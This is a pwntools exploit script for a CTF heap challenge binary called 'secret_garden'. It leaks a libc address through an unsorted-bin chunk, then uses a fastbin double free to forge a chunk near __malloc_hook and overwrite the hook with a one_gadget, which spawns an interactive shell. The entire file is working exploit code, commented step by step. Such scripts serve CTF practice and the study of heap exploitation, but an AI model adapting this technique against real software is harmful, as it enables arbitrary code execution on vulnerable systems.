from pwn import *
context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF('./data/bin/heap23_49_pwnable_secret_garden')
libc = elf.libc
io = process('./data/bin/heap23_49_pwnable_secret_garden') 
one_gadget = 0xf03a4

sla     = lambda delim,data     :  io.sendlineafter(delim,data)
add     = lambda len,name,color :  (sla("choice : ","1"),sla("name :",str(len)),sla("flower :",name),sla("flower :",color))
show    = lambda                :  (sla("choice : ","2"))
rm      = lambda num            :  (sla("choice : ","3"),sla("garden:",str(num)))

# use unsorted bin to leak libc
add(500,"1","1")
add(40,"1","1")
add(10,"1","1")
rm(1);rm(0)
add(500,"","1")
show();io.recvuntil("flower[3] :")
libc_addr = u64(io.recv(6)+b'\x00\x00')-(libc.sym['__realloc_hook']+2)
log.success('libc_addr: ' + hex(libc_addr))

malloc_hook = libc_addr + libc.symbols['__malloc_hook']

# use fastbin double free attack to modify malloc_hook, the fake chunk addr is found by dynamic debug
fake_chunk = malloc_hook-0x23
add(104,'1','1')
add(104,'1','1')
rm(4);rm(5);rm(4)
add(104,p64(fake_chunk),'1')
add(104,'1','1')
add(104,'1','1')
add(104,b'a'*19+p64(libc_addr+one_gadget),'1')

# call malloc by using double free error to satisfy one_gadget constraints
rm(8);rm(8)
io.interactive()